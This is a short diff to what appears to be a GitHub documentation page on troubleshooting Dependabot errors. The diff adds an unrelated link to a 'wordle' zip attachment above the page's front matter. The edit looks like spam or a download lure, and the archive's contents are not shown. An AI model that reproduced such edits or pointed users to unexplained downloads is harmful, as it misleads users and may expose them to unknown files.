@@ -1,3 +1,4 @@
+[wordle-c13465735b9912c9cd0375f1b11ecb9315e9b641 (2).zip](https://github.com/github/docs/files/8057175/wordle-c13465735b9912c9cd0375f1b11ecb9315e9b641.2.zip)
 ---
 title: Troubleshooting Dependabot errors
 intro: 'Sometimes {% data variables.product.prodname_dependabot %} is unable to raise a pull request to update your dependencies. You can review the error and unblock {% data variables.product.prodname_dependabot %}.'
